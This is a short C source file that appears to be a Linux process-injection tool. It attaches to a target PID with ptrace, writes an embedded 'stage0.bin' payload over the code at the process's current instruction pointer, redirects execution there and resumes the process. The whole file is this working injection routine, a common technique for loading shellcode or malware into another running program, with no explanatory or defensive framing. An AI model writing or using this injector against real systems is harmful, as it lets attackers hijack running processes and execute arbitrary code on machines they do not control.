#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/types.h>

static unsigned char payload[] = {
#embed "stage0.bin"
};
static long payload_len = sizeof(payload);

static int _strtoi(char *s, int *o) {
   char *e;
   errno = 0;
   
   long t = strtol(s, &e, 10);
   if (errno == ERANGE || e == s || *e != '\0') {
      return 0;
   }
   *o = (int)t;
   return 1;
}

int main(int argc, char *argv[]) {
   if (argc != 2) {
      printf("usage: %s [pid]\n", argv[0]);
      return 1;
   }

   pid_t pid;
   if (!_strtoi(argv[1], &pid)) {
      printf("error: invalid pid\n");
      return 1;
   }

   if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
      perror("ptrace");
      return 1;
   }

   waitpid(pid, NULL, 0);
   struct user_regs_struct regs = {0};
   if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
      perror("ptrace");
      return 1;
   }

   void *target_addr = (void*)regs.rip;
   for (long i = 0; i < payload_len; i += sizeof(long)) {
        long word = 0;
        size_t remaining = payload_len - i;
        size_t to_copy = remaining < sizeof(long) ? remaining : sizeof(long);
        memcpy(&word, &payload[i], to_copy);
        
        if (ptrace(PTRACE_POKEDATA, pid, target_addr + i, word) == -1) {
            perror("ptrace");
            return 1;
        }
    }

   regs.rip = (unsigned long)target_addr;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
        perror("ptrace");
        return 1;
    }
   
   if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
      perror("ptrace");
      return 1;
   }
}
